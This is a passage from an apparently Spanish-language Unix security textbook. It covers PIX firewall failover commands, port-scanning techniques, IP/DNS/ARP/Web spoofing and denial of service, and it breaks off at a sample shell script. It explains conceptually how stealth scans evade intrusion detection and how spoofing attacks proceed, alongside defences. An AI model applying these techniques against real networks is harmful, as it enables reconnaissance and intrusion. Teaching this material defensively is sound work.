&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Xmit&#x00A0;Q:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;3&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;53081
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1855--><para>En el resultado de la orden anterior vemos que la unidad principal est&#x00E1; funcionando normalmente, mientras
que la secundaria est&#x00E1; en standby; esto ser&#x00E1; lo habitual si no entra en juego el failover o incluso si entra y la
unidad principal se recupera, ya que en ese caso se hace un rebalanceo. Si en lugar de que todas las
interfaces est&#x00E9;n en estado normal aparecieran errores temporales de escasa duraci&#x00F3;n, no hay ning&#x00FA;n problema,
ya que esto suele signi&#xFB01;car que el cortafuegos est&#x00E1; testeando la alta disponibilidad y la conectividad de las
interfaces.
<!--br/-->
<!--br/-->El failover es casi transparente a la administraci&#x00F3;n de la m&#x00E1;quina, en el sentido de que la con&#xFB01;guraci&#x00F3;n s&#x00F3;lo se
realiza en la unidad activa en cada momento, y autom&#x00E1;ticamente se trans&#xFB01;ere a la que est&#x00E1; en standby;
adem&#x00E1;s, como hemos dicho, cuando entra la alta disponibilidad las unidades intercambian sus direcciones
IP, por lo que el acceso v&#x02CA;&#x0131;a telnet a la m&#x00E1;quina se realiza contra la misma direcci&#x00F3;n que durante el
funcionamiento normal de los equipos. Incluso si trabajamos con stateful failover, las unidades
mantienen la informaci&#x00F3;n de estado de cada conexi&#x00F3;n, por lo que en caso de switchover ninguna
de ellas se pierde; en caso contrario, las conexiones activas son eliminadas y el cliente debe
reestablecerlas.
<!--br/-->
<!--br/-->Con la orden failover podemos habilitar el failover, y con no failover deshabilitarlo:


     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;no&#x00A0;failover
&#x00A0;pixie(config)#&#x00A0;sh&#x00A0;failover
&#x00A0;Failover&#x00A0;Off
&#x00A0;Cable&#x00A0;status:&#x00A0;Normal
&#x00A0;Reconnect&#x00A0;timeout&#x00A0;0:00:00
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1886--><para>Las &#x00F3;rdenes anteriores tambi&#x00E9;n admiten argumentos; si indicamos &#x2018;link&#x2019; podemos de&#xFB01;nir la interfaz de
stateful failover, por la que ambas unidades intercambiar&#x00E1;n informaci&#x00F3;n. Con &#x2018;ip address&#x2019; podemos
con&#xFB01;gurar una direcci&#x00F3;n de failover para cada interfaz de la unidad secundaria, y con el par&#x00E1;metro
&#x2018;active&#x2019; forzamos a una unidad determinada ponerse como activa (o en standby, si ejecutamos no
failover active). Como siempre, podemos teclear el signo &#x2018;?&#x2019; para obtener ayuda desde l&#x02CA;&#x0131;nea de
comandos:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;failover&#x00A0;?
&#x00A0;usage:&#x00A0;[no]&#x00A0;failover&#x00A0;[active]
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;failover&#x00A0;ip&#x00A0;address&#x00A0;&#x003C;if&#x005F;name&#x003E;&#x00A0;&#x003C;ip&#x005F;address&#x003E;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;failover&#x00A0;timeout&#x00A0;&#x003C;hh:mm:ss&#x003E;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;failover&#x00A0;reset
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;failover&#x00A0;link&#x00A0;&#x003C;if&#x005F;name&#x003E;
&#x00A0;pixie(config)#&#x00A0;failover
</literallayout>


<!--l. 1--><para>

  </para></section><!--end subsection--></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-27200017"  ></anchor>Ataques remotos</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">17.1</abbrev><anchor 
   id="x1-27300017.1"  ></anchor>Escaneos de puertos</title>
<!--l. 3--><para>  Una de las primeras actividades que un potencial (o no tan potencial) atacante realizar&#x00E1; contra su
objetivo ser&#x00E1; sin duda un escaneo de puertos, un portscan; esto le permitir&#x00E1; obtener en primer lugar
informaci&#x00F3;n b&#x00E1;sica acerca de qu&#x00E9; servicios estamos ofreciendo en nuestras m&#x00E1;quinas y, adicionalmente, otros
detalles de nuestro entorno como qu&#x00E9; sistema operativo tenemos instalados en cada host o ciertas
caracter&#x02CA;&#x0131;sticas de la arquitectura de nuestra red. Analizando qu&#x00E9; puertos est&#x00E1;n abiertos en un sistema, el
atacante puede buscar agujeros en cada uno de los servicios ofrecidos: cada puerto abierto en una m&#x00E1;quina
es una potencial puerta de entrada a la misma.
<!--br/-->
<!--br/-->Comprobar el estado de un determinado puerto es a priori una tarea muy sencilla; incluso es posible
llevarla a cabo desde la l&#x02CA;&#x0131;nea de &#x00F3;rdenes, usando una herramienta tan gen&#x00E9;rica como telnet. Por ejemplo,
imaginemos que queremos conocer el estado del puerto 5000 en la m&#x00E1;quina cuya direcci&#x00F3;n IP es
192.168.0.10; si el telnet a dicho puerto ofrece una respuesta, entonces est&#x00E1; abierto y escuchando
peticiones:

     </para><literallayout role="verbatim">
&#x00A0;anita:~$&#x00A0;telnet&#x00A0;192.168.0.10&#x00A0;5000
&#x00A0;Trying&#x00A0;192.168.0.10...
&#x00A0;Connected&#x00A0;to&#x00A0;192.168.0.10.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;&#x02C6;D
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;anita:~$
</literallayout>
<!--l. 30--><para>Si por el contrario el puerto est&#x00E1; abierto pero en &#x00E9;l no hay ning&#x00FA;n demonio atendiendo peticiones, la respuesta
ser&#x00E1; similar a la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:~$&#x00A0;telnet&#x00A0;192.168.0.10&#x00A0;5000
&#x00A0;Trying&#x00A0;192.168.0.10...
&#x00A0;telnet:&#x00A0;Unable&#x00A0;to&#x00A0;connect&#x00A0;to&#x00A0;remote&#x00A0;host:&#x00A0;Connection&#x00A0;refused
&#x00A0;anita:~$
</literallayout>
<!--l. 40--><para>Por &#x00FA;ltimo, si el puerto est&#x00E1; protegido por un cortafuegos, lo m&#x00E1;s
probable <anchor 
   id="x1-273001f1"  ></anchor><footnote><para>     Es posible, dependiendo de la con&#xFB01;guraci&#x00F3;n y del tipo de nuestro cortafuegos, que obtengamos otro tipo de respuesta,
generalmente un &#x2018;Connection refused&#x2019;.</para></footnote> es
que no obtengamos respuesta alguna; el telnet lanzado se quedar&#x00E1; intentando la conexi&#x00F3;n hasta que se
produzca un timeout o hasta que lo paremos manualmente:

     </para><literallayout role="verbatim">
&#x00A0;anita:~$&#x00A0;telnet&#x00A0;192.168.0.10&#x00A0;5000
&#x00A0;Trying&#x00A0;192.168.0.10...
&#x00A0;&#x02C6;D
&#x00A0;anita:~$
</literallayout>
<!--l. 55--><para>Por lo general, nadie en su sano juicio usar&#x02CA;&#x0131;a telnet para realizar un escaneo de puertos masivo contra un
sistema o contra toda una red; existen herramientas como strobe o nmap (la m&#x00E1;s conocida) que pueden
realizar esta tarea de una forma m&#x00E1;s o menos c&#x00F3;moda y automatizable. Evidentemente, ninguno de estos
programas se dedica a lanzar telnets contra los puertos de un sistema: los escaneadores de puertos actuales
implementan diferentes t&#x00E9;cnicas que permiten desde detectar desde la versi&#x00F3;n del sistema operativo
usado en la m&#x00E1;quina atacada hasta pasar inadvertidos ante diferentes sistemas de detecci&#x00F3;n de
intrusos.
<!--br/-->
<!--br/-->Existen diferentes aproximaciones para clasi&#xFB01;car los escaneos de puertos, tanto en funci&#x00F3;n de las t&#x00E9;cnicas
seguidas en el ataque como en funci&#x00F3;n de a qu&#x00E9; sistemas o puertos concretos va dirigido. Por ejemplo, se
habla de un escaneo horizontal cuando el atacante busca la disponibilidad de determinado servicio en
diferentes m&#x00E1;quinas de una red; por ejemplo, si el pirata dispone de un exploit que aprovecha un fallo en la
implementaci&#x00F3;n de sendmail, es normal que trate de averiguar qu&#x00E9; m&#x00E1;quinas aceptan peticiones SMTP en un
determinado segmento para posteriormente atacar a dichos sistemas. Si por contra el pirata s&#x00F3;lo escanea
puertos de una m&#x00E1;quina, se denomina al ataque escaneo vertical, y suele denotar el inter&#x00E9;s del
atacante en ese host concreto; si comprueba todos los puertos del sistema al escaneo se le
denomina vanilla, mientras que si s&#x00F3;lo lo hace contra determinados puertos o rangos, se le
denomina strobe (en referencia al programa del mismo nombre). Si nos basamos en las t&#x00E9;cnicas
utilizadas, podemos dividir los escaneos en tres grandes familias: open, half&#x2013;open y stealth;
vamos a hablar con m&#x00E1;s detalle de cada una de ellas y de los diferentes tipos escaneos que las
forman.
<!--br/-->
<!--br/-->Los escaneos open se basan en el establecimiento de una conexi&#x00F3;n TCP completa mediante el conocido
como protocolo de acuerdo de tres v&#x02CA;&#x0131;as o three&#x2013;way handshake (<citation>[?]</citation>), por lo que son muy sencillos de
detectar y detener. Utilizan la llamada connect(), siendo lo m&#x00E1;s similar &#x2013; guardado las distancias &#x2013; al
ejemplo del telnet que hemos visto antes: el escaneador intenta establecer una conexi&#x00F3;n con
un puerto concreto del host atacado, y en funci&#x00F3;n de la respuesta obtenida conoce su estado:
una t&#x00E9;cnica r&#x00E1;pida, sencilla, &#xFB01;able y que no necesita de ning&#x00FA;n privilegio especial en la m&#x00E1;quina
atacante.
<!--br/-->
<!--br/-->La segunda t&#x00E9;cnica que hemos comentado es la de los escaneos half&#x2013;open; en este caso, el pirata
&#xFB01;naliza la conexi&#x00F3;n antes de que se complete el protocolo de acuerdo de tres v&#x02CA;&#x0131;as, lo que de
entrada di&#xFB01;culta &#x2013; aunque no mucho &#x2013; la detecci&#x00F3;n del ataque por parte de algunos detectores de
intrusos muy simples (casi todos los actuales son capaces de detectarlos). Dentro de esta t&#x00E9;cncia
se encuentra el SYN Scanning: cuando el origen &#x2013; atacante &#x2013; recibe del destino &#x2013; m&#x00E1;quina
escaneada &#x2013; los bits SYN+ACK, env&#x02CA;&#x0131;a un bit RST (no es necesaria una nueva trama, ya que este bit
se env&#x02CA;&#x0131;a autom&#x00E1;ticamente a nivel de n&#x00FA;cleo) en lugar del ACK correspondiente a un three&#x2013;way
handshake completo. Los escaneos SYN son f&#x00E1;cilmente detectables y pueden ser bloqueados en
cualquier cortafuegos; existe una variable de esta t&#x00E9;cnica denominada dumb scanning (<citation>[?]</citation>) en
la que entra en juego una tercera m&#x00E1;quina denominada &#x2018;tonta&#x2019; (por el poco tr&#x00E1;&#xFB01;co que emite
y recibe), algo que puede ayudar al pirata a camu&#xFB02;ar su origen real. Sin embargo, el dumb
scanning es m&#x00E1;s complicado que el SYN scanning, por lo que se utiliza mucho menos en la vida
real.
<!--br/-->
<!--br/-->Finalmente, existe otra modelo de escaneo denominado stealth scanning. En diciembre de 1995 Christopher
Klaus proporcion&#x00F3; las pautas de ciertas t&#x00E9;cnicas de escaneo que permit&#x02CA;&#x0131;an al atacante eludir la acci&#x00F3;n de los
sistemas de detecci&#x00F3;n de intrusos de la &#x00E9;poca (<citation>[?]</citation>) y a las que bautiz&#x00F3; como stealth scanning; actualmente el
signi&#xFB01;cado del t&#x00E9;rmino ha cambiado, ya que lo que Klaus present&#x00F3; se denomina hoy en d&#x02CA;&#x0131;a half&#x2013;open scanning, y

por stealth scanning se conoce a una familia de t&#x00E9;cnicas de escaneo que cumplen alguna de las siguientes
condiciones <anchor 
   id="x1-273002f2"  ></anchor><footnote><para>     Tambi&#x00E9;n se utiliza el t&#x00E9;rmino stealth para referirse &#x00FA;nicamente a los escaneos NULL, que como veremos despu&#x00E9;s son aquellos
con todos los &#xFB02;ags de la trama reseteados.</para></footnote>:
     </para><itemizedlist>
     <listitem>
     <!--l. 122--><para>Eludir cortafuegos o listas de control de acceso.
     </para></listitem>
     <listitem>
     <!--l. 123--><para>No ser registradas por sistemas de detecci&#x00F3;n de intrusos, ni orientados a red ni en el propio
     host escaneado.
     </para></listitem>
     <listitem>
     <!--l. 125--><para>Simular tr&#x00E1;&#xFB01;co normal y real para no levantar sospechas ante un analizador de red.</para></listitem></itemizedlist>
<!--l. 128--><para>Una de las t&#x00E9;cnicas que encontramos dentro de la familia de los escaneos stealth es la conocida como
SYN+ACK. La idea es muy simple, y consiste en una violaci&#x00F3;n del three&#x2013;way handshake: el atacante, en
lugar de enviar en primer lugar una trama SYN, env&#x02CA;&#x0131;a SYN+ACK. Si el puerto est&#x00E1; abierto simplemente se
ignora, y si est&#x00E1; cerrado sabe que no ha recibido previamente un paquete SYN, por lo que lo considera un
error y env&#x02CA;&#x0131;a una trama RST para &#xFB01;nalizar la conexi&#x00F3;n.
<!--br/-->
<!--br/-->Los escaneos basados en este m&#x00E9;todo se usan poco en la actualidad, debido al elevado n&#x00FA;mero de falsos
positivos que pueden generar: s&#x00F3;lo debemos pensar en los m&#x00FA;ltiples motivos &#x2013; aparte de un puerto abierto &#x2013;
que pueden existir para que un sistema no responda ante una petici&#x00F3;n SYN+ACK: desde listas de control de
accesos en los routers o cortafuegos hasta simples timeouts.
<!--br/-->
<!--br/-->Otra t&#x00E9;cnica dentro de los escaneos stealth es el FIN scanning (<citation>[?]</citation>): en este caso, el atacante env&#x02CA;&#x0131;a a su
objetivo una trama con el bit FIN activo, ante lo que este responde con un RST si el puerto est&#x00E1; cerrado, o
simplemente no responde en caso de estar abierto; como en el caso de los escaneos SYN+ACK este
m&#x00E9;todo puede proporcionar muchos falsos positivos, por lo que tampoco se utiliza mucho hoy en
d&#x02CA;&#x0131;a.
<!--br/-->
<!--br/-->Tambi&#x00E9;n en <citation>[?]</citation>, se propone un m&#x00E9;todo de escaneo algo m&#x00E1;s complejo: el ACK. El atacante env&#x02CA;&#x0131;a una trama
con este bit activo, y si el puerto destino est&#x00E1; abierto es muy posible que o bien el campo TTL del paquete
de vuelta sea menor que el del resto de las tramas RST recibidas, o que el tama~no de ventana sea mayor
que cero: como podemos ver, en este caso no basta con analizar el bit RST sino tambi&#x00E9;n la
cabecera IP del paquete respuesta. Este m&#x00E9;todo es dif&#x02CA;&#x0131;cil de registrar por parte de los detectores
de intrusos, pero se basa en el c&#x00F3;digo de red de BSD, por lo que es dependiente del operativo
escaneado.
<!--br/-->
<!--br/-->Para &#xFB01;nalizar con la familia de stealth scanning vamos a hablar de dos m&#x00E9;todos opuestos entre s&#x02CA;&#x0131; pero que
se basan en una misma idea y proporcionan resultados similares: se trata de XMAS y NULL. Los primeros,
tambi&#x00E9;n denominados escaneos &#x2018;&#x00E1;rbol de navidad&#x2019;, se basan en enviar al objetivo tramas con todos los bits
TCP (URG, ACK, PST, RST, SYN y FIN) activos; si el puerto est&#x00E1; abierto el n&#x00FA;cleo del sistema operativo
eliminar&#x00E1; la trama, ya que evidentemente la considera una violaci&#x00F3;n del three&#x2013;way handshake, pero si est&#x00E1;
cerrado devolver&#x00E1; un RST al atacante. Como antes, este m&#x00E9;todo puede generar demasiados falsos positivos, y
adem&#x00E1;s s&#x00F3;lo es aplicable contra m&#x00E1;quinas Unix debido a que est&#x00E1; basado en el c&#x00F3;digo de red de
BSD.
<!--br/-->
<!--br/-->Por contra, el m&#x00E9;todo opuesto al XMAS se denomina NULL scanning, y evidentemente consiste
en enviar tramas con todos los bits TCP reseteados; el resultado es similar: no se devolver&#x00E1;
ning&#x00FA;n resultado si el puerto est&#x00E1; abierto, y se enviar&#x00E1; un RST si est&#x00E1; cerrado. Aunque en principio
este m&#x00E9;todo ser&#x02CA;&#x0131;a aplicable a cualquier pila TCP/IP (<citation>[?]</citation>), la implementaci&#x00F3;n &#x2013; incorrecta &#x2013; que
de la misma hacen algunos operativos (entre ellos HP/UX o IRIX) hace que en ocasiones se
envien bits RST tambi&#x00E9;n desde los puertos abiertos, lo que puede proporcionar demasiados falsos
positivos.

<!--br/-->
<!--br/-->Antes de acabar el punto, vamos a hablar de otra t&#x00E9;cnica de escaneo de puertos que no se puede
englobar en las tres clases de las que hemos hablado: se trata de los escaneos UDP, que al
contrario de todos los comentados hasta el momento utiliza este protocolo, y no TCP, para
determinar el estado de los puertos de una m&#x00E1;quina. Al enviar un datagrama UDP a un puerto
abierto este no ofrece respuesta alguna, pero si est&#x00E1; cerrado devuelve un mensaje de error ICMP:
ICMP<informalequation><graphic 
fileref="unixsec316x.gif"></graphic></informalequation>PORT<informalequation><graphic 
fileref="unixsec317x.gif"></graphic></informalequation>UNREACHABLE. Evidentemente, estos ataques son muy sencillos de detectar y evitar
tanto en un sistema de detecci&#x00F3;n de intrusos como en los n&#x00FA;cleos de algunos Unices, y por si
esto fuera poco debemos recordar que UDP no es un protocolo orientado a conexi&#x00F3;n (como lo
es TCP), por lo que la p&#x00E9;rdida de datagramas puede dar lugar a un elevado n&#x00FA;mero de falsos
positivos.
<!--br/-->
<!--br/-->Hemos repasado las t&#x00E9;cnicas m&#x00E1;s habituales &#x2013; no todas &#x2013; que un atacante puede utilizar para averiguar el
estado de los puertos de nuestras m&#x00E1;quinas; muchas de ellas son sencillas de detectar y evitar utilizando
cortafuegos sencillos y gratuitos como iptables o IPFilter, por lo que tenemos una raz&#x00F3;n m&#x00E1;s para utilizar
un &#xFB01;rewall que proteja nuestra red. Los puertos abiertos de un sistema proporcionan a un pirata
una valiosa informaci&#x00F3;n sobre el mismo, en muchos casos su&#xFB01;ciente para iniciar un ataque m&#x00E1;s
serio contra la m&#x00E1;quina, as&#x02CA;&#x0131; que mucho mejor para nosotros cuanto m&#x00E1;s dif&#x02CA;&#x0131;cil le pongamos esta
tarea.
  </para></section><!--end section--><!--l. 201--><section 
role="section"><title><abbrev role="title-mark">17.2</abbrev><anchor 
   id="x1-27400017.2"  ></anchor>Spoo&#xFB01;ng</title>
<!--l. 202--><para>  Por spoo&#xFB01;ng se conoce a la creaci&#x00F3;n de tramas TCP/IP utilizando una direcci&#x00F3;n IP falseada; la idea de este
ataque &#x2013; al menos la idea &#x2013; es muy sencilla: desde su equipo, un pirata simula la identidad de otra m&#x00E1;quina
de la red para conseguir acceso a recursos de un tercer sistema que ha establecido alg&#x00FA;n tipo de con&#xFB01;anza
basada en el nombre o la direcci&#x00F3;n IP del host suplantado. Y como los anillos de con&#xFB01;anza basados en estas
caracter&#x02CA;&#x0131;sticas tan f&#x00E1;cilmente falsi&#xFB01;cables son a&#x00FA;n demasiado abundantes (no tenemos m&#x00E1;s que pensar en los
comandos r-<informalequation><graphic 
fileref="unixsec318x.gif"></graphic></informalequation>, los accesos NFS, o la protecci&#x00F3;n de servicios de red mediante TCP Wrapper), el
spoo&#xFB01;ng sigue siendo en la actualidad un ataque no trivial, pero factible contra cualquier tipo de
organizaci&#x00F3;n.
<!--br/-->
<!--br/-->Como hemos visto, en el spoo&#xFB01;ng entran en juego tres m&#x00E1;quinas: un atacante, un atacado, y un sistema
suplantado que tiene cierta relaci&#x00F3;n con el atacado; para que el pirata pueda conseguir su objetivo necesita
por un lado establecer una comunicaci&#x00F3;n falseada con su objetivo, y por otro evitar que el equipo
suplantado inter&#xFB01;era en el ataque (<citation>[?]</citation>). Probablemente esto &#x00FA;ltimo no le sea muy dif&#x02CA;&#x0131;cil de conseguir: a
pesar de que existen m&#x00FA;ltiples formas de dejar fuera de juego al sistema suplantado &#x2013; al menos a los ojos
del atacado &#x2013; que no son triviales (modi&#xFB01;car rutas de red, ubicar un &#xFB01;ltrado de paquetes entre
ambos sistemas&#x2026;), lo m&#x00E1;s f&#x00E1;cil en la mayor&#x02CA;&#x0131;a de ocasiones es simplemente lanzar una negaci&#x00F3;n
de servicio contra el sistema en cuesti&#x00F3;n. Aunque en el punto siguiente hablaremos con m&#x00E1;s
detalle de estos ataques, no suele ser dif&#x02CA;&#x0131;cil &#x2018;tumbar&#x2019;, o al menos bloquear parcialmente, un
sistema medio; si a pesar de todo el atacante no lo consigue, simplemente puede esperar a que
desconecten de la red a la m&#x00E1;quina a la que desea suplantar (por ejemplo, por cuestiones de puro
mantenimiento).
<!--br/-->
<!--br/-->El otro punto importante del ataque, la comunicaci&#x00F3;n falseada entre dos equipos, no es tan inmediato como
el anterior y es donde reside la principal di&#xFB01;cultad del spoo&#xFB01;ng. En un escenario t&#x02CA;&#x0131;pico del ataque, un
pirata env&#x02CA;&#x0131;a una trama SYN a su objetivo indicando como direcci&#x00F3;n origen la de esa tercera m&#x00E1;quina que est&#x00E1;
fuera de servicio y que mantiene alg&#x00FA;n tipo de relaci&#x00F3;n de con&#xFB01;anza con la atacada. El host objetivo
responde con un SYN+ACK a la tercera m&#x00E1;quina, que simplemente lo ignorar&#x00E1; por estar fuera de
servicio (si no lo hiciera, la conexi&#x00F3;n se resetear&#x02CA;&#x0131;a y el ataque no ser&#x02CA;&#x0131;a posible), y el atacante
enviar&#x00E1; ahora una trama ACK a su objetivo, tambi&#x00E9;n con la direcci&#x00F3;n origen de la tercera m&#x00E1;quina.
Para que la conexi&#x00F3;n llegue a establecerse, esta &#x00FA;ltima trama deber&#x00E1; enviarse con el n&#x00FA;mero de
secuencia adecuado; el pirata ha de predecir correctamente este n&#x00FA;mero: si no lo hace, la trama ser&#x00E1;
descartada), y si lo consigue la conexi&#x00F3;n se establecer&#x00E1; y podr&#x00E1; comenzar a enviar datos a su objetivo,
generalmente para tratar de insertar una puerta trasera que permita una conexi&#x00F3;n normal entre las dos
m&#x00E1;quinas.

<!--br/-->
<!--br/-->Podemos comprobar que el spoo&#xFB01;ng no es inmediato; de entrada, el atacante ha de hacerse una idea de
c&#x00F3;mo son generados e incrementados los n&#x00FA;meros de secuencia TCP, y una vez que lo sepa ha
de conseguir &#x2018;enga~nar&#x2019; a su objetivo utilizando estos n&#x00FA;meros para establecer la comunicaci&#x00F3;n;
cuanto m&#x00E1;s robusta sea esta generaci&#x00F3;n por parte del objetivo, m&#x00E1;s dif&#x02CA;&#x0131;cil lo tendr&#x00E1; el pirata para
realizar el ataque con &#x00E9;xito. Adem&#x00E1;s, es necesario recordar que el spoo&#xFB01;ng es un ataque ciego:
el atacante no ve en ning&#x00FA;n momento las respuestas que emite su objetivo, ya que estas van
dirigidas a la m&#x00E1;quina que previamente ha sido deshabilitada, por lo que debe presuponer qu&#x00E9; est&#x00E1;
sucediendo en cada momento y responder de forma adecuada en base a esas suposiciones.
Ser&#x02CA;&#x0131;a imposible tratar con el detenimiento que merecen todos los detalles relativos al spoo&#xFB01;ng
por lo que para obtener informaci&#x00F3;n adicional es necesario dirigirse a excelentes art&#x02CA;&#x0131;culos que
estudian todos los pormenores del ataque, como <citation>[?]</citation> o <citation>[?]</citation>; de la misma forma, para conocer con
detalle el funcionamiento del protocolo TCP/IP y sus problemas podemos consultar <citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation> y
<citation>[?]</citation>.
<!--br/-->
<!--br/-->Para evitar ataques de spoo&#xFB01;ng exitosos contra nuestros sistemas podemos tomar diferentes medidas
preventivas; en primer lugar, parece evidente que una gran ayuda es reforzar la secuencia de predicci&#x00F3;n de
n&#x00FA;meros de secuencia TCP: un esquema de generaci&#x00F3;n robusto puede ser el basado en <citation>[?]</citation>, que la mayor&#x02CA;&#x0131;a de
Unices son capaces de implantar (aunque muchos de ellos no lo hagan por defecto). Otra medida sencilla
es eliminar las relaciones de con&#xFB01;anza basadas en la direcci&#x00F3;n IP o el nombre de las m&#x00E1;quinas, sustituy&#x00E9;ndolas
por relaciones basadas en claves criptogr&#x00E1;&#xFB01;cas; el cifrado y el &#xFB01;ltrado de las conexiones que pueden
aceptar nuestras m&#x00E1;quinas tambi&#x00E9;n son unas medidas de seguridad importantes de cara a evitar el
spoo&#xFB01;ng.
<!--br/-->
<!--br/-->Hasta ahora hemos hablado del ataque gen&#x00E9;rico contra un host denominado spoo&#xFB01;ng o, para ser m&#x00E1;s exactos,
IP Spoo&#xFB01;ng; existen otros ataques de falseamiento relacionados en mayor o menor medida con este, entre
los que destacan el DNS Spoo&#xFB01;ng, el ARP Spoo&#xFB01;ng y el Web Spoo&#xFB01;ng (<citation>[?]</citation>). Para &#xFB01;nalizar este punto,
vamos a comentarlos brevemente e indicar algunas lecturas donde se puede ampliar informaci&#x00F3;n sobre los
mismos:
     </para><itemizedlist>
     <listitem>
     <!--l. 281--><para>DNS Spoo&#xFB01;ng
     <!--br/-->Este ataque hace referencia al falseamiento de una direcci&#x00F3;n IP ante una consulta de resoluci&#x00F3;n
     de nombre (esto es, resolver con una direcci&#x00F3;n falsa un cierto nombre DNS), o viceversa (resolver
     con un nombre falso una cierta direcci&#x00F3;n IP). Esto se puede conseguir de diferentes formas,
     desde modi&#xFB01;cando las entradas del servidor encargado de resolver una cierta petici&#x00F3;n para
     falsear las relaciones direcci&#x00F3;n&#x2013;nombre, hasta comprometiendo un servidor que infecte la cach&#x00E9;
     de otro (lo que se conoce como DNS Poisoning); incluso sin acceso a un servidor DNS real,
     un atacante puede enviar datos falseados como respuesta a una petici&#x00F3;n de su v&#x02CA;&#x0131;ctima sin m&#x00E1;s
     que averiguar los n&#x00FA;meros de secuencia correctos.
     </para></listitem>
     <listitem>
     <!--l. 292--><para>ARP Spoo&#xFB01;ng
     <!--br/-->El ataque denominado ARP Spoo&#xFB01;ng hace referencia a la construcci&#x00F3;n de tramas de solicitud
     y respuesta ARP falseadas, de forma que en una red local se puede forzar a una determinada
     m&#x00E1;quina a que env&#x02CA;&#x0131;e los paquetes a un host atacante en lugar de hacerlo a su destino leg&#x02CA;&#x0131;timo.
     La idea es sencilla, y los efectos del ataque pueden ser muy negativos: desde negaciones de
     servicio hasta interceptaci&#x00F3;n de datos, incluyendo algunos Man in the Middle contra ciertos
     protocolos cifrados. En <citation>[?]</citation> podemos obtener m&#x00E1;s informaci&#x00F3;n acerca de este ataque, as&#x02CA;&#x0131; como
     c&#x00F3;digo fuente para enviar tramas falseadas y comprobar los efectos del ARP Spoo&#xFB01;ng en nuestra
     red.
     </para></listitem>
     <listitem>
     <!--l. 303--><para>Web Spoo&#xFB01;ng

     <!--br/-->Este ataque permite a un pirata visualizar y modi&#xFB01;car cualquier p&#x00E1;gina web que su v&#x02CA;&#x0131;ctima
     solicite a trav&#x00E9;s de un navegador, incluyendo las conexiones seguras v&#x02CA;&#x0131;a SSL. Para ello, mediante
     c&#x00F3;digo malicioso un atacante crea una ventana del navegador correspondiente, de apariencia
     inofensiva, en la m&#x00E1;quina de su v&#x02CA;&#x0131;ctima; a partir de ah&#x02CA;&#x0131;, enruta todas las p&#x00E1;ginas dirigidas al
     equipo atacado &#x2013; incluyendo las cargadas en nuevas ventanas del navegador &#x2013; a trav&#x00E9;s de su
     propia m&#x00E1;quina, donde son modi&#xFB01;cadas para que cualquier evento generado por el cliente sea
     registrado (esto implica registrar cualquier dato introducido en un formulario, cualquier click
     en un enlace, etc.). Para obtener m&#x00E1;s informaci&#x00F3;n acerca del Web Spoo&#xFB01;ng podemos consultar
     <citation>[?]</citation>.</para></listitem></itemizedlist>
<!--l. 316--><para>
  </para></section><!--end section--><!--l. 316--><section 
role="section"><title><abbrev role="title-mark">17.3</abbrev><anchor 
   id="x1-27500017.3"  ></anchor>Negaciones de servicio</title>
<!--l. 317--><para>  Las negaciones de servicio (conocidas como DoS, Denial of Service) son ataques dirigidos contra un
recurso inform&#x00E1;tico (generalmente una m&#x00E1;quina o una red, pero tambi&#x00E9;n podr&#x02CA;&#x0131;a tratarse de una simple
impresora o una terminal) con el objetivo de degradar total o parcialmente los servicios prestados
por ese recurso a sus usuarios leg&#x02CA;&#x0131;timos; constituyen en muchos casos uno de los ataques m&#x00E1;s
sencillos y contundentes contra todo tipo de servicios, y en entornos donde la disponibilidad es
valorada por encima de otros par&#x00E1;metros de la seguridad global puede convertirse en un serio
problema, ya que un pirata puede interrumpir constantemente un servicio sin necesidad de grandes
conocimientos o recursos, utilizando simplemente sencillos programas y un m&#x00F3;dem y un PC
caseros.
<!--br/-->
<!--br/-->Las negaciones de servicio m&#x00E1;s habituales suelen consistir en la inhabilitaci&#x00F3;n total de un determinado
servicio o de un sistema completo, bien porque ha sido realmente bloqueado por el atacante o bien porque
est&#x00E1; tan degradado que es incapaz de ofrecer un servicio a sus usuarios. En la mayor parte de
sistemas, un usuario con acceso shell no tendr&#x02CA;&#x0131;a muchas di&#xFB01;cultades en causar una negaci&#x00F3;n de
servicio que tirara abajo la m&#x00E1;quina o la ralentizara enormemente; esto no tiene porqu&#x00E9; ser &#x2013; y
de hecho en muchos casos no lo es &#x2013; un ataque intencionado, sino que puede deberse a un
simple error de programaci&#x00F3;n. Por ejemplo, pensemos en el siguiente shellscript (funciona en
Linux):

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/usr/local/bin/lanzador
&#x00A0;#!/bin/sh
&#x00A0;ps&#x00A0;-ef|grep&#x00A0;calcula|grep&#x00A0;-v&#x00A0;grep&#x00A0;2&#x003E;&#x0026;1&#x00A0;&#x003E;/dev/null
&#x00A0;if&#x00A0;[&#x00A0;$?&#x00A0;-eq&#x00A0;1&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/local/bin/calcula&#x00A0;&#x0026;
&#x00A0;fi
&#x00A0;luisa:~#
